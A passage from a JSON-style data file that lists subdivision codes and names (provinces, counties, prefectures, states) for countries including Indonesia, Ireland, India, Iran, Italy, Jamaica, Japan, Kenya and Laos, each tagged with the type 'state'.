      ""type"": ""state""
    },
    ""BT"": {
      ""name"": ""Banten"",
      ""type"": ""state""
    },
    ""JT"": {
      ""name"": ""Jawa Tengah"",
      ""type"": ""state""
    },
    ""JI"": {
      ""name"": ""Jawa Timur"",
      ""type"": ""state""
    },
    ""YO"": {
      ""name"": ""Daerah Istimewa Yogyakarta"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Bali"",
      ""type"": ""state""
    },
    ""NB"": {
      ""name"": ""Nusa Tenggara Barat"",
      ""type"": ""state""
    },
    ""NT"": {
      ""name"": ""Nusa Tenggara Timur"",
      ""type"": ""state""
    },
    ""KB"": {
      ""name"": ""Kalimantan Barat"",
      ""type"": ""state""
    },
    ""KT"": {
      ""name"": ""Kalimantan Tengah"",
      ""type"": ""state""
    },
    ""KI"": {
      ""name"": ""Kalimantan Timur"",
      ""type"": ""state""
    },
    ""KS"": {
      ""name"": ""Kalimantan Selatan"",
      ""type"": ""state""
    },
    ""KU"": {
      ""name"": ""Kalimantan Utara"",
      ""type"": ""state""
    },
    ""SA"": {
      ""name"": ""Sulawesi Utara"",
      ""type"": ""state""
    },
    ""ST"": {
      ""name"": ""Sulawesi Tengah"",
      ""type"": ""state""
    },
    ""SG"": {
      ""name"": ""Sulawesi Tenggara"",
      ""type"": ""state""
    },
    ""SR"": {
      ""name"": ""Sulawesi Barat"",
      ""type"": ""state""
    },
    ""SN"": {
      ""name"": ""Sulawesi Selatan"",
      ""type"": ""state""
    },
    ""GO"": {
      ""name"": ""Gorontalo"",
      ""type"": ""state""
    },
    ""MA"": {
      ""name"": ""Maluku"",
      ""type"": ""state""
    },
    ""MU"": {
      ""name"": ""Maluku Utara"",
      ""type"": ""state""
    },
    ""PA"": {
      ""name"": ""Papua"",
      ""type"": ""state""
    },
    ""PB"": {
      ""name"": ""Papua Barat"",
      ""type"": ""state""
    },
  },
  ""IE"": {
    ""CW"": {
      ""name"": ""Carlow"",
      ""type"": ""state""
    },
    ""CN"": {
      ""name"": ""Cavan"",
      ""type"": ""state""
    },
    ""CE"": {
      ""name"": ""Clare"",
      ""type"": ""state""
    },
    ""CO"": {
      ""name"": ""Cork"",
      ""type"": ""state""
    },
    ""DL"": {
      ""name"": ""Donegal"",
      ""type"": ""state""
    },
    ""D"": {
      ""name"": ""Dublin"",
      ""type"": ""state""
    },
    ""G"": {
      ""name"": ""Galway"",
      ""type"": ""state""
    },
    ""KY"": {
      ""name"": ""Kerry"",
      ""type"": ""state""
    },
    ""KE"": {
      ""name"": ""Kildare"",
      ""type"": ""state""
    },
    ""KK"": {
      ""name"": ""Kilkenny"",
      ""type"": ""state""
    },
    ""LS"": {
      ""name"": ""Laois"",
      ""type"": ""state""
    },
    ""LM"": {
      ""name"": ""Leitrim"",
      ""type"": ""state""
    },
    ""LK"": {
      ""name"": ""Limerick"",
      ""type"": ""state""
    },
    ""LD"": {
      ""name"": ""Longford"",
      ""type"": ""state""
    },
    ""LH"": {
      ""name"": ""Louth"",
      ""type"": ""state""
    },
    ""MO"": {
      ""name"": ""Mayo"",
      ""type"": ""state""
    },
    ""MH"": {
      ""name"": ""Meath"",
      ""type"": ""state""
    },
    ""MN"": {
      ""name"": ""Monaghan"",
      ""type"": ""state""
    },
    ""OY"": {
      ""name"": ""Offaly"",
      ""type"": ""state""
    },
    ""RN"": {
      ""name"": ""Roscommon"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Sligo"",
      ""type"": ""state""
    },
    ""TA"": {
      ""name"": ""Tipperary"",
      ""type"": ""state""
    },
    ""WD"": {
      ""name"": ""Waterford"",
      ""type"": ""state""
    },
    ""WH"": {
      ""name"": ""Westmeath"",
      ""type"": ""state""
    },
    ""WX"": {
      ""name"": ""Wexford"",
      ""type"": ""state""
    },
    ""WW"": {
      ""name"": ""Wicklow"",
      ""type"": ""state""
    },
  },
  ""IN"": {
    ""AP"": {
      ""name"": ""Andhra Pradesh"",
      ""type"": ""state""
    },
    ""AR"": {
      ""name"": ""Arunachal Pradesh"",
      ""type"": ""state""
    },
    ""AS"": {
      ""name"": ""Assam"",
      ""type"": ""state""
    },
    ""BR"": {
      ""name"": ""Bihar"",
      ""type"": ""state""
    },
    ""CT"": {
      ""name"": ""Chhattisgarh"",
      ""type"": ""state""
    },
    ""GA"": {
      ""name"": ""Goa"",
      ""type"": ""state""
    },
    ""GJ"": {
      ""name"": ""Gujarat"",
      ""type"": ""state""
    },
    ""HR"": {
      ""name"": ""Haryana"",
      ""type"": ""state""
    },
    ""HP"": {
      ""name"": ""Himachal Pradesh"",
      ""type"": ""state""
    },
    ""JK"": {
      ""name"": ""Jammu and Kashmir"",
      ""type"": ""state""
    },
    ""JH"": {
      ""name"": ""Jharkhand"",
      ""type"": ""state""
    },
    ""KA"": {
      ""name"": ""Karnataka"",
      ""type"": ""state""
    },
    ""KL"": {
      ""name"": ""Kerala"",
      ""type"": ""state""
    },
    ""LA"": {
      ""name"": ""Ladakh"",
      ""type"": ""state""
    },
    ""MP"": {
      ""name"": ""Madhya Pradesh"",
      ""type"": ""state""
    },
    ""MH"": {
      ""name"": ""Maharashtra"",
      ""type"": ""state""
    },
    ""MN"": {
      ""name"": ""Manipur"",
      ""type"": ""state""
    },
    ""ML"": {
      ""name"": ""Meghalaya"",
      ""type"": ""state""
    },
    ""MZ"": {
      ""name"": ""Mizoram"",
      ""type"": ""state""
    },
    ""NL"": {
      ""name"": ""Nagaland"",
      ""type"": ""state""
    },
    ""OR"": {
      ""name"": ""Odisha"",
      ""type"": ""state""
    },
    ""PB"": {
      ""name"": ""Punjab"",
      ""type"": ""state""
    },
    ""RJ"": {
      ""name"": ""Rajasthan"",
      ""type"": ""state""
    },
    ""SK"": {
      ""name"": ""Sikkim"",
      ""type"": ""state""
    },
    ""TN"": {
      ""name"": ""Tamil Nadu"",
      ""type"": ""state""
    },
    ""TS"": {
      ""name"": ""Telangana"",
      ""type"": ""state""
    },
    ""TR"": {
      ""name"": ""Tripura"",
      ""type"": ""state""
    },
    ""UK"": {
      ""name"": ""Uttarakhand"",
      ""type"": ""state""
    },
    ""UP"": {
      ""name"": ""Uttar Pradesh"",
      ""type"": ""state""
    },
    ""WB"": {
      ""name"": ""West Bengal"",
      ""type"": ""state""
    },
    ""AN"": {
      ""name"": ""Andaman and Nicobar Islands"",
      ""type"": ""state""
    },
    ""CH"": {
      ""name"": ""Chandigarh"",
      ""type"": ""state""
    },
    ""DN"": {
      ""name"": ""Dadra and Nagar Haveli"",
      ""type"": ""state""
    },
    ""DD"": {
      ""name"": ""Daman and Diu"",
      ""type"": ""state""
    },
    ""DL"": {
      ""name"": ""Delhi"",
      ""type"": ""state""
    },
    ""LD"": {
      ""name"": ""Lakshadeep"",
      ""type"": ""state""
    },
    ""PY"": {
      ""name"": ""Pondicherry (Puducherry)"",
      ""type"": ""state""
    },
  },
  ""IR"": {
    ""KHZ"": {
      ""name"": ""Khuzestan  (\u062e\u0648\u0632\u0633\u062a\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""THR"": {
      ""name"": ""Tehran  (\u062a\u0647\u0631\u0627\u0646)"",
      ""type"": ""state""
    },
    ""ILM"": {
      ""name"": ""Ilaam (\u0627\u06cc\u0644\u0627\u0645)"",
      ""type"": ""state""
    },
    ""BHR"": {
      ""name"": ""Bushehr (\u0628\u0648\u0634\u0647\u0631)"",
      ""type"": ""state""
    },
    ""ADL"": {
      ""name"": ""Ardabil (\u0627\u0631\u062f\u0628\u06cc\u0644)"",
      ""type"": ""state"",
    },
    ""ESF"": {
      ""name"": ""Isfahan (\u0627\u0635\u0641\u0647\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""YZD"": {
      ""name"": ""Yazd (\u06cc\u0632\u062f)"",
      ""type"": ""state""
    },
    ""KRH"": {
      ""name"": ""Kermanshah (\u06a9\u0631\u0645\u0627\u0646\u0634\u0627\u0647)"",
      ""type"": ""state"",
    },
    ""KRN"": {
      ""name"": ""Kerman (\u06a9\u0631\u0645\u0627\u0646)"",
      ""type"": ""state""
    },
    ""HDN"": {
      ""name"": ""Hamadan (\u0647\u0645\u062f\u0627\u0646)"",
      ""type"": ""state""
    },
    ""GZN"": {
      ""name"": ""Ghazvin (\u0642\u0632\u0648\u06cc\u0646)"",
      ""type"": ""state""
    },
    ""ZJN"": {
      ""name"": ""Zanjan (\u0632\u0646\u062c\u0627\u0646)"",
      ""type"": ""state""
    },
    ""LRS"": {
      ""name"": ""Luristan (\u0644\u0631\u0633\u062a\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""ABZ"": {
      ""name"": ""Alborz (\u0627\u0644\u0628\u0631\u0632)"",
      ""type"": ""state""
    },
    ""EAZ"": {
      ""name"": ""East Azarbaijan (\u0622\u0630\u0631\u0628\u0627\u06cc\u062c\u0627\u0646 \u0634\u0631\u0642\u06cc)"",
      ""type"": ""state"",
    },
    ""WAZ"": {
      ""name"": ""West Azarbaijan (\u0622\u0630\u0631\u0628\u0627\u06cc\u062c\u0627\u0646 \u063a\u0631\u0628\u06cc)"",
      ""type"": ""state"",
    },
    ""CHB"": {
      ""name"": ""Chaharmahal and Bakhtiari (\u0686\u0647\u0627\u0631\u0645\u062d\u0627\u0644 \u0648 \u0628\u062e\u062a\u06cc\u0627\u0631\u06cc)"",
      ""type"": ""state"",
    },
    ""SKH"": {
      ""name"": ""South Khorasan (\u062e\u0631\u0627\u0633\u0627\u0646 \u062c\u0646\u0648\u0628\u06cc)"",
      ""type"": ""state"",
    },
    ""RKH"": {
      ""name"": ""Razavi Khorasan (\u062e\u0631\u0627\u0633\u0627\u0646 \u0631\u0636\u0648\u06cc)"",
      ""type"": ""state"",
    },
    ""NKH"": {
      ""name"": ""North Khorasan (\u062e\u0631\u0627\u0633\u0627\u0646 \u0634\u0645\u0627\u0644\u06cc)"",
      ""type"": ""state"",
    },
    ""SMN"": {
      ""name"": ""Semnan (\u0633\u0645\u0646\u0627\u0646)"",
      ""type"": ""state""
    },
    ""FRS"": {
      ""name"": ""Fars (\u0641\u0627\u0631\u0633)"",
      ""type"": ""state""
    },
    ""QHM"": {
      ""name"": ""Qom (\u0642\u0645)"",
      ""type"": ""state""
    },
    ""KRD"": {
      ""name"": ""Kurdistan \/ \u06a9\u0631\u062f\u0633\u062a\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""KBD"": {
      ""name"": ""Kohgiluyeh and BoyerAhmad (\u06a9\u0647\u06af\u06cc\u0644\u0648\u06cc\u06cc\u0647 \u0648 \u0628\u0648\u06cc\u0631\u0627\u062d\u0645\u062f)"",
      ""type"": ""state"",
    },
    ""GLS"": {
      ""name"": ""Golestan (\u06af\u0644\u0633\u062a\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""GIL"": {
      ""name"": ""Gilan (\u06af\u06cc\u0644\u0627\u0646)"",
      ""type"": ""state""
    },
    ""MZN"": {
      ""name"": ""Mazandaran (\u0645\u0627\u0632\u0646\u062f\u0631\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""MKZ"": {
      ""name"": ""Markazi (\u0645\u0631\u06a9\u0632\u06cc)"",
      ""type"": ""state""
    },
    ""HRZ"": {
      ""name"": ""Hormozgan (\u0647\u0631\u0645\u0632\u06af\u0627\u0646)"",
      ""type"": ""state"",
    },
    ""SBN"": {
      ""name"": ""Sistan and Baluchestan (\u0633\u06cc\u0633\u062a\u0627\u0646 \u0648 \u0628\u0644\u0648\u0686\u0633\u062a\u0627\u0646)"",
      ""type"": ""state"",
    },
  },
  ""IS"": {},
  ""IT"": {
    ""AG"": {
      ""name"": ""Agrigento"",
      ""type"": ""state""
    },
    ""AL"": {
      ""name"": ""Alessandria"",
      ""type"": ""state""
    },
    ""AN"": {
      ""name"": ""Ancona"",
      ""type"": ""state""
    },
    ""AO"": {
      ""name"": ""Aosta"",
      ""type"": ""state""
    },
    ""AR"": {
      ""name"": ""Arezzo"",
      ""type"": ""state""
    },
    ""AP"": {
      ""name"": ""Ascoli Piceno"",
      ""type"": ""state""
    },
    ""AT"": {
      ""name"": ""Asti"",
      ""type"": ""state""
    },
    ""AV"": {
      ""name"": ""Avellino"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Bari"",
      ""type"": ""state""
    },
    ""BT"": {
      ""name"": ""Barletta-Andria-Trani"",
      ""type"": ""state""
    },
    ""BL"": {
      ""name"": ""Belluno"",
      ""type"": ""state""
    },
    ""BN"": {
      ""name"": ""Benevento"",
      ""type"": ""state""
    },
    ""BG"": {
      ""name"": ""Bergamo"",
      ""type"": ""state""
    },
    ""BI"": {
      ""name"": ""Biella"",
      ""type"": ""state""
    },
    ""BO"": {
      ""name"": ""Bologna"",
      ""type"": ""state""
    },
    ""BZ"": {
      ""name"": ""Bolzano"",
      ""type"": ""state""
    },
    ""BS"": {
      ""name"": ""Brescia"",
      ""type"": ""state""
    },
    ""BR"": {
      ""name"": ""Brindisi"",
      ""type"": ""state""
    },
    ""CA"": {
      ""name"": ""Cagliari"",
      ""type"": ""state""
    },
    ""CL"": {
      ""name"": ""Caltanissetta"",
      ""type"": ""state""
    },
    ""CB"": {
      ""name"": ""Campobasso"",
      ""type"": ""state""
    },
    ""CE"": {
      ""name"": ""Caserta"",
      ""type"": ""state""
    },
    ""CT"": {
      ""name"": ""Catania"",
      ""type"": ""state""
    },
    ""CZ"": {
      ""name"": ""Catanzaro"",
      ""type"": ""state""
    },
    ""CH"": {
      ""name"": ""Chieti"",
      ""type"": ""state""
    },
    ""CO"": {
      ""name"": ""Como"",
      ""type"": ""state""
    },
    ""CS"": {
      ""name"": ""Cosenza"",
      ""type"": ""state""
    },
    ""CR"": {
      ""name"": ""Cremona"",
      ""type"": ""state""
    },
    ""KR"": {
      ""name"": ""Crotone"",
      ""type"": ""state""
    },
    ""CN"": {
      ""name"": ""Cuneo"",
      ""type"": ""state""
    },
    ""EN"": {
      ""name"": ""Enna"",
      ""type"": ""state""
    },
    ""FM"": {
      ""name"": ""Fermo"",
      ""type"": ""state""
    },
    ""FE"": {
      ""name"": ""Ferrara"",
      ""type"": ""state""
    },
    ""FI"": {
      ""name"": ""Firenze"",
      ""type"": ""state""
    },
    ""FG"": {
      ""name"": ""Foggia"",
      ""type"": ""state""
    },
    ""FC"": {
      ""name"": ""Forl\u00ec-Cesena"",
      ""type"": ""state""
    },
    ""FR"": {
      ""name"": ""Frosinone"",
      ""type"": ""state""
    },
    ""GE"": {
      ""name"": ""Genova"",
      ""type"": ""state""
    },
    ""GO"": {
      ""name"": ""Gorizia"",
      ""type"": ""state""
    },
    ""GR"": {
      ""name"": ""Grosseto"",
      ""type"": ""state""
    },
    ""IM"": {
      ""name"": ""Imperia"",
      ""type"": ""state""
    },
    ""IS"": {
      ""name"": ""Isernia"",
      ""type"": ""state""
    },
    ""SP"": {
      ""name"": ""La Spezia"",
      ""type"": ""state""
    },
    ""AQ"": {
      ""name"": ""L'Aquila"",
      ""type"": ""state""
    },
    ""LT"": {
      ""name"": ""Latina"",
      ""type"": ""state""
    },
    ""LE"": {
      ""name"": ""Lecce"",
      ""type"": ""state""
    },
    ""LC"": {
      ""name"": ""Lecco"",
      ""type"": ""state""
    },
    ""LI"": {
      ""name"": ""Livorno"",
      ""type"": ""state""
    },
    ""LO"": {
      ""name"": ""Lodi"",
      ""type"": ""state""
    },
    ""LU"": {
      ""name"": ""Lucca"",
      ""type"": ""state""
    },
    ""MC"": {
      ""name"": ""Macerata"",
      ""type"": ""state""
    },
    ""MN"": {
      ""name"": ""Mantova"",
      ""type"": ""state""
    },
    ""MS"": {
      ""name"": ""Massa-Carrara"",
      ""type"": ""state""
    },
    ""MT"": {
      ""name"": ""Matera"",
      ""type"": ""state""
    },
    ""ME"": {
      ""name"": ""Messina"",
      ""type"": ""state""
    },
    ""MI"": {
      ""name"": ""Milano"",
      ""type"": ""state""
    },
    ""MO"": {
      ""name"": ""Modena"",
      ""type"": ""state""
    },
    ""MB"": {
      ""name"": ""Monza e della Brianza"",
      ""type"": ""state""
    },
    ""NA"": {
      ""name"": ""Napoli"",
      ""type"": ""state""
    },
    ""NO"": {
      ""name"": ""Novara"",
      ""type"": ""state""
    },
    ""NU"": {
      ""name"": ""Nuoro"",
      ""type"": ""state""
    },
    ""OR"": {
      ""name"": ""Oristano"",
      ""type"": ""state""
    },
    ""PD"": {
      ""name"": ""Padova"",
      ""type"": ""state""
    },
    ""PA"": {
      ""name"": ""Palermo"",
      ""type"": ""state""
    },
    ""PR"": {
      ""name"": ""Parma"",
      ""type"": ""state""
    },
    ""PV"": {
      ""name"": ""Pavia"",
      ""type"": ""state""
    },
    ""PG"": {
      ""name"": ""Perugia"",
      ""type"": ""state""
    },
    ""PU"": {
      ""name"": ""Pesaro e Urbino"",
      ""type"": ""state""
    },
    ""PE"": {
      ""name"": ""Pescara"",
      ""type"": ""state""
    },
    ""PC"": {
      ""name"": ""Piacenza"",
      ""type"": ""state""
    },
    ""PI"": {
      ""name"": ""Pisa"",
      ""type"": ""state""
    },
    ""PT"": {
      ""name"": ""Pistoia"",
      ""type"": ""state""
    },
    ""PN"": {
      ""name"": ""Pordenone"",
      ""type"": ""state""
    },
    ""PZ"": {
      ""name"": ""Potenza"",
      ""type"": ""state""
    },
    ""PO"": {
      ""name"": ""Prato"",
      ""type"": ""state""
    },
    ""RG"": {
      ""name"": ""Ragusa"",
      ""type"": ""state""
    },
    ""RA"": {
      ""name"": ""Ravenna"",
      ""type"": ""state""
    },
    ""RC"": {
      ""name"": ""Reggio Calabria"",
      ""type"": ""state""
    },
    ""RE"": {
      ""name"": ""Reggio Emilia"",
      ""type"": ""state""
    },
    ""RI"": {
      ""name"": ""Rieti"",
      ""type"": ""state""
    },
    ""RN"": {
      ""name"": ""Rimini"",
      ""type"": ""state""
    },
    ""RM"": {
      ""name"": ""Roma"",
      ""type"": ""state""
    },
    ""RO"": {
      ""name"": ""Rovigo"",
      ""type"": ""state""
    },
    ""SA"": {
      ""name"": ""Salerno"",
      ""type"": ""state""
    },
    ""SS"": {
      ""name"": ""Sassari"",
      ""type"": ""state""
    },
    ""SV"": {
      ""name"": ""Savona"",
      ""type"": ""state""
    },
    ""SI"": {
      ""name"": ""Siena"",
      ""type"": ""state""
    },
    ""SR"": {
      ""name"": ""Siracusa"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Sondrio"",
      ""type"": ""state""
    },
    ""SU"": {
      ""name"": ""Sud Sardegna"",
      ""type"": ""state""
    },
    ""TA"": {
      ""name"": ""Taranto"",
      ""type"": ""state""
    },
    ""TE"": {
      ""name"": ""Teramo"",
      ""type"": ""state""
    },
    ""TR"": {
      ""name"": ""Terni"",
      ""type"": ""state""
    },
    ""TO"": {
      ""name"": ""Torino"",
      ""type"": ""state""
    },
    ""TP"": {
      ""name"": ""Trapani"",
      ""type"": ""state""
    },
    ""TN"": {
      ""name"": ""Trento"",
      ""type"": ""state""
    },
    ""TV"": {
      ""name"": ""Treviso"",
      ""type"": ""state""
    },
    ""TS"": {
      ""name"": ""Trieste"",
      ""type"": ""state""
    },
    ""UD"": {
      ""name"": ""Udine"",
      ""type"": ""state""
    },
    ""VA"": {
      ""name"": ""Varese"",
      ""type"": ""state""
    },
    ""VE"": {
      ""name"": ""Venezia"",
      ""type"": ""state""
    },
    ""VB"": {
      ""name"": ""Verbano-Cusio-Ossola"",
      ""type"": ""state""
    },
    ""VC"": {
      ""name"": ""Vercelli"",
      ""type"": ""state""
    },
    ""VR"": {
      ""name"": ""Verona"",
      ""type"": ""state""
    },
    ""VV"": {
      ""name"": ""Vibo Valentia"",
      ""type"": ""state""
    },
    ""VI"": {
      ""name"": ""Vicenza"",
      ""type"": ""state""
    },
    ""VT"": {
      ""name"": ""Viterbo"",
      ""type"": ""state""
    },
  },
  ""IL"": {},
  ""IM"": {},
  ""JM"": {
    ""JM-01"": {
      ""name"": ""Kingston"",
      ""type"": ""state""
    },
    ""JM-02"": {
      ""name"": ""Saint Andrew"",
      ""type"": ""state""
    },
    ""JM-03"": {
      ""name"": ""Saint Thomas"",
      ""type"": ""state""
    },
    ""JM-04"": {
      ""name"": ""Portland"",
      ""type"": ""state""
    },
    ""JM-05"": {
      ""name"": ""Saint Mary"",
      ""type"": ""state""
    },
    ""JM-06"": {
      ""name"": ""Saint Ann"",
      ""type"": ""state""
    },
    ""JM-07"": {
      ""name"": ""Trelawny"",
      ""type"": ""state""
    },
    ""JM-08"": {
      ""name"": ""Saint James"",
      ""type"": ""state""
    },
    ""JM-09"": {
      ""name"": ""Hanover"",
      ""type"": ""state""
    },
    ""JM-10"": {
      ""name"": ""Westmoreland"",
      ""type"": ""state""
    },
    ""JM-11"": {
      ""name"": ""Saint Elizabeth"",
      ""type"": ""state""
    },
    ""JM-12"": {
      ""name"": ""Manchester"",
      ""type"": ""state""
    },
    ""JM-13"": {
      ""name"": ""Clarendon"",
      ""type"": ""state""
    },
    ""JM-14"": {
      ""name"": ""Saint Catherine"",
      ""type"": ""state""
    },
  },
  ""JP"": {
    ""JP01"": {
      ""name"": ""Hokkaido"",
      ""type"": ""state""
    },
    ""JP02"": {
      ""name"": ""Aomori"",
      ""type"": ""state""
    },
    ""JP03"": {
      ""name"": ""Iwate"",
      ""type"": ""state""
    },
    ""JP04"": {
      ""name"": ""Miyagi"",
      ""type"": ""state""
    },
    ""JP05"": {
      ""name"": ""Akita"",
      ""type"": ""state""
    },
    ""JP06"": {
      ""name"": ""Yamagata"",
      ""type"": ""state""
    },
    ""JP07"": {
      ""name"": ""Fukushima"",
      ""type"": ""state""
    },
    ""JP08"": {
      ""name"": ""Ibaraki"",
      ""type"": ""state""
    },
    ""JP09"": {
      ""name"": ""Tochigi"",
      ""type"": ""state""
    },
    ""JP10"": {
      ""name"": ""Gunma"",
      ""type"": ""state""
    },
    ""JP11"": {
      ""name"": ""Saitama"",
      ""type"": ""state""
    },
    ""JP12"": {
      ""name"": ""Chiba"",
      ""type"": ""state""
    },
    ""JP13"": {
      ""name"": ""Tokyo"",
      ""type"": ""state""
    },
    ""JP14"": {
      ""name"": ""Kanagawa"",
      ""type"": ""state""
    },
    ""JP15"": {
      ""name"": ""Niigata"",
      ""type"": ""state""
    },
    ""JP16"": {
      ""name"": ""Toyama"",
      ""type"": ""state""
    },
    ""JP17"": {
      ""name"": ""Ishikawa"",
      ""type"": ""state""
    },
    ""JP18"": {
      ""name"": ""Fukui"",
      ""type"": ""state""
    },
    ""JP19"": {
      ""name"": ""Yamanashi"",
      ""type"": ""state""
    },
    ""JP20"": {
      ""name"": ""Nagano"",
      ""type"": ""state""
    },
    ""JP21"": {
      ""name"": ""Gifu"",
      ""type"": ""state""
    },
    ""JP22"": {
      ""name"": ""Shizuoka"",
      ""type"": ""state""
    },
    ""JP23"": {
      ""name"": ""Aichi"",
      ""type"": ""state""
    },
    ""JP24"": {
      ""name"": ""Mie"",
      ""type"": ""state""
    },
    ""JP25"": {
      ""name"": ""Shiga"",
      ""type"": ""state""
    },
    ""JP26"": {
      ""name"": ""Kyoto"",
      ""type"": ""state""
    },
    ""JP27"": {
      ""name"": ""Osaka"",
      ""type"": ""state""
    },
    ""JP28"": {
      ""name"": ""Hyogo"",
      ""type"": ""state""
    },
    ""JP29"": {
      ""name"": ""Nara"",
      ""type"": ""state""
    },
    ""JP30"": {
      ""name"": ""Wakayama"",
      ""type"": ""state""
    },
    ""JP31"": {
      ""name"": ""Tottori"",
      ""type"": ""state""
    },
    ""JP32"": {
      ""name"": ""Shimane"",
      ""type"": ""state""
    },
    ""JP33"": {
      ""name"": ""Okayama"",
      ""type"": ""state""
    },
    ""JP34"": {
      ""name"": ""Hiroshima"",
      ""type"": ""state""
    },
    ""JP35"": {
      ""name"": ""Yamaguchi"",
      ""type"": ""state""
    },
    ""JP36"": {
      ""name"": ""Tokushima"",
      ""type"": ""state""
    },
    ""JP37"": {
      ""name"": ""Kagawa"",
      ""type"": ""state""
    },
    ""JP38"": {
      ""name"": ""Ehime"",
      ""type"": ""state""
    },
    ""JP39"": {
      ""name"": ""Kochi"",
      ""type"": ""state""
    },
    ""JP40"": {
      ""name"": ""Fukuoka"",
      ""type"": ""state""
    },
    ""JP41"": {
      ""name"": ""Saga"",
      ""type"": ""state""
    },
    ""JP42"": {
      ""name"": ""Nagasaki"",
      ""type"": ""state""
    },
    ""JP43"": {
      ""name"": ""Kumamoto"",
      ""type"": ""state""
    },
    ""JP44"": {
      ""name"": ""Oita"",
      ""type"": ""state""
    },
    ""JP45"": {
      ""name"": ""Miyazaki"",
      ""type"": ""state""
    },
    ""JP46"": {
      ""name"": ""Kagoshima"",
      ""type"": ""state""
    },
    ""JP47"": {
      ""name"": ""Okinawa"",
      ""type"": ""state""
    },
  },
  ""KE"": {
    ""KE01"": {
      ""name"": ""Baringo"",
      ""type"": ""state""
    },
    ""KE02"": {
      ""name"": ""Bomet"",
      ""type"": ""state""
    },
    ""KE03"": {
      ""name"": ""Bungoma"",
      ""type"": ""state""
    },
    ""KE04"": {
      ""name"": ""Busia"",
      ""type"": ""state""
    },
    ""KE05"": {
      ""name"": ""Elgeyo-Marakwet"",
      ""type"": ""state""
    },
    ""KE06"": {
      ""name"": ""Embu"",
      ""type"": ""state""
    },
    ""KE07"": {
      ""name"": ""Garissa"",
      ""type"": ""state""
    },
    ""KE08"": {
      ""name"": ""Homa Bay"",
      ""type"": ""state""
    },
    ""KE09"": {
      ""name"": ""Isiolo"",
      ""type"": ""state""
    },
    ""KE10"": {
      ""name"": ""Kajiado"",
      ""type"": ""state""
    },
    ""KE11"": {
      ""name"": ""Kakamega"",
      ""type"": ""state""
    },
    ""KE12"": {
      ""name"": ""Kericho"",
      ""type"": ""state""
    },
    ""KE13"": {
      ""name"": ""Kiambu"",
      ""type"": ""state""
    },
    ""KE14"": {
      ""name"": ""Kilifi"",
      ""type"": ""state""
    },
    ""KE15"": {
      ""name"": ""Kirinyaga"",
      ""type"": ""state""
    },
    ""KE16"": {
      ""name"": ""Kisii"",
      ""type"": ""state""
    },
    ""KE17"": {
      ""name"": ""Kisumu"",
      ""type"": ""state""
    },
    ""KE18"": {
      ""name"": ""Kitui"",
      ""type"": ""state""
    },
    ""KE19"": {
      ""name"": ""Kwale"",
      ""type"": ""state""
    },
    ""KE20"": {
      ""name"": ""Laikipia"",
      ""type"": ""state""
    },
    ""KE21"": {
      ""name"": ""Lamu"",
      ""type"": ""state""
    },
    ""KE22"": {
      ""name"": ""Machakos"",
      ""type"": ""state""
    },
    ""KE23"": {
      ""name"": ""Makueni"",
      ""type"": ""state""
    },
    ""KE24"": {
      ""name"": ""Mandera"",
      ""type"": ""state""
    },
    ""KE25"": {
      ""name"": ""Marsabit"",
      ""type"": ""state""
    },
    ""KE26"": {
      ""name"": ""Meru"",
      ""type"": ""state""
    },
    ""KE27"": {
      ""name"": ""Migori"",
      ""type"": ""state""
    },
    ""KE28"": {
      ""name"": ""Mombasa"",
      ""type"": ""state""
    },
    ""KE29"": {
      ""name"": ""Murang\u2019a"",
      ""type"": ""state""
    },
    ""KE30"": {
      ""name"": ""Nairobi County"",
      ""type"": ""state""
    },
    ""KE31"": {
      ""name"": ""Nakuru"",
      ""type"": ""state""
    },
    ""KE32"": {
      ""name"": ""Nandi"",
      ""type"": ""state""
    },
    ""KE33"": {
      ""name"": ""Narok"",
      ""type"": ""state""
    },
    ""KE34"": {
      ""name"": ""Nyamira"",
      ""type"": ""state""
    },
    ""KE35"": {
      ""name"": ""Nyandarua"",
      ""type"": ""state""
    },
    ""KE36"": {
      ""name"": ""Nyeri"",
      ""type"": ""state""
    },
    ""KE37"": {
      ""name"": ""Samburu"",
      ""type"": ""state""
    },
    ""KE38"": {
      ""name"": ""Siaya"",
      ""type"": ""state""
    },
    ""KE39"": {
      ""name"": ""Taita-Taveta"",
      ""type"": ""state""
    },
    ""KE40"": {
      ""name"": ""Tana River"",
      ""type"": ""state""
    },
    ""KE41"": {
      ""name"": ""Tharaka-Nithi"",
      ""type"": ""state""
    },
    ""KE42"": {
      ""name"": ""Trans Nzoia"",
      ""type"": ""state""
    },
    ""KE43"": {
      ""name"": ""Turkana"",
      ""type"": ""state""
    },
    ""KE44"": {
      ""name"": ""Uasin Gishu"",
      ""type"": ""state""
    },
    ""KE45"": {
      ""name"": ""Vihiga"",
      ""type"": ""state""
    },
    ""KE46"": {
      ""name"": ""Wajir"",
      ""type"": ""state""
    },
    ""KE47"": {
      ""name"": ""West Pokot"",
      ""type"": ""state""
    },
  },
  ""KR"": {},
  ""KW"": {},
  ""LA"": {
    ""AT"": {
      ""name"": ""Attapeu"",
      ""type"": ""state""
    },
    ""BK"": {
      ""name"": ""Bokeo"",
      ""type"": ""state""
    },
    ""BL"": {
      ""name"": ""Bolikhamsai"",
      ""type"": ""state""
    },
    ""CH"": {
      ""name"": ""Champasak"",
      ""type"": ""state""
    },
    ""HO"": {
      ""name"": ""Houaphanh"",
      ""type"": ""state""
    },
    ""KH"": {
      ""name"": ""Khammouane"",
      ""type"": ""state""
    },
    ""LM"": {
      ""name"": ""Luang Namtha"",
      ""type"": ""state""
    },
    ""LP"": {
      ""name"": ""Luang Prabang"",
      ""type"": ""state""
    },
    ""OU"": {
      ""name"": ""Oudomxay"",
      ""type"": ""state""
    },
    ""PH"": {
      ""name"": ""Phongsaly"",
      ""type"": ""state""
    },
    ""SL"": {
      ""name"": ""Salavan"",
      ""type"": ""state""
    },
    ""SV"": {
      ""name"": ""Savannakhet"",
      ""type"": ""state""
    },
    ""VI"": {
      ""name"": ""Vientiane Province"",
      ""type"": ""state""
    },
    ""VT"": {
      ""name"": ""Vientiane"",
      ""type"": ""state""
    },
    ""XA"": {
      ""name"": ""Sainyabuli"",
      ""type"": ""state""
    },
    ""XE"": {
      ""name"": ""Sekong"",
